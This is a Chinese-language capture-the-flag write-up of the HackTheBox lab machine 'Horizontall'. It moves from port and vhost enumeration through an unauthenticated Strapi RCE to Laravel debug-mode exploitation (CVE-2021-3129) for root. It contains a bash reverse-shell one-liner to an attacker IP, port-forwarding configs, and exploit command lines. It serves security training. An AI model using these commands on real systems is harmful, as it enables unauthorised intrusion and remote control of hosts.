---
title: HackTheBox-horizontall
typora-root-url: ..
date: 2021-12-27 11:33:44
tags: HTB
---

## 简介

hostname：horizontall.htb

ip：10.10.11.105

os：linux



## 信息收集

### nmap

```
nmap -sS -A -sC -sV -p- --min-rate 500 10.10.11.105
```

```
Nmap scan report for 10.10.11.105
Host is up (0.26s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     (protocol 2.0)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-methods: No Allow or Public header in OPTIONS response (status code 301)
|_http-title: Did not follow redirect to http://horizontall.htb
```



### dirsearch

```
python3 dirsearch.py -u http://horizontall.htb/
```

![image-20211227114624216](/assets/image-20211227114624216.png)



### gobuster

都没有发现什么可用的信息，尝试DNS爆破(虚拟主机爆破)

这里用到了新的fuzz工具 gobuster ：https://github.com/OJ/gobuster ， 支持 vhost、dns、dir等类型

fuzz 目录

```
gobuster dir -u http://horizontall.htb/ -t 90 -w directory-list-2.3-medium.txt -e 
```

![image-20211228101747401](/assets/image-20211228101747401.png)

Fuzz vhost

```
gobuster vhost -u http://Horizontall.htb -w subdomains-top1million-110000.txt -t 100
```

![image-20211228105509822](/assets/image-20211228105509822.png)

fuzz dns

```
gobuster dns -d mysite.com -t 50 -w common-names.txt -i
```

![image-20211228101609163](/assets/image-20211228101609163.png)



访问 http://api-prod.horizontall.htb/ 只有一个welcome

![image-20211228105648852](/assets/image-20211228105648852.png)

fuzz 目录

```
gobuster dir -u http://api-prod.horizontall.htb/ -t 90 -w directory-list-2.3-medium.txt -e 
```

![image-20211228110012157](/assets/image-20211228110012157.png)

## 攻击阶段

### strapi rce

挨个访问上面扫描出的目录，发现一个 strapi cms ，在exploit-db搜索，发现有未授权rce可使用。  

https://www.exploit-db.com/exploits/50239

使用该rce为blind rce，测试发现可用

![image-20211228140851469](/assets/image-20211228140851469.png)

![image-20211228140910291](/assets/image-20211228140910291.png)

反弹shell

```
bash -c 'exec bash -i &>/dev/tcp/10.10.14.52/5555 <&1'
```

![image-20211228140959125](/assets/image-20211228140959125.png)

拿到user flag

![image-20211228141037865](/assets/image-20211228141037865.png)



## 权限提升

获取交互式shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

查看端口

```
ss -antp
```

![image-20211228141745172](/assets/image-20211228141745172.png)

80端口为 horizontall.htb ， 1337 端口 api-prod.horizontall.htb  8000端口 Laravel v8  3306为mysql

使用 LinEnum.sh 脚本收集信息并查看后，未发现可直接利用点。猜测通过 8000端口的服务，拿developer 权限

由于 端口监听在 127.0.0.1 ，此处使用 frp做端口映射

frpc.ini

```
common]
server_addr = 10.10.14.52
server_port = 7000

[http]
type = tcp
local_ip = 127.0.0.1
local_port = 8000
remote_port = 8080
```

frps.ini

```
[common]
bind_port = 7000
```

服务端启动

```
./frps -c ./frps.ini
```

客户端启动

```
./frpc -c ./frpc.ini
```

启动成功后，访问vps的 8080 端口  （此处可通过 上传 ssh公钥，使用ssh本地转发实现）

```
ssh -i id_rsa -L 8000:127.0.0.1:8000 strapi@10.10.11.105
```

![image-20211228155029517](/assets/image-20211228155029517.png)



exploit db上搜索，laravel8 debug rce 漏洞

使用https://github.com/LucifielHack/CVE-2021-3129_exploit  攻击larael服务

```
python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 "cat /root/root.txt"
```

![image-20211228173343669](/assets/image-20211228173343669.png)

拿到 root.txt 
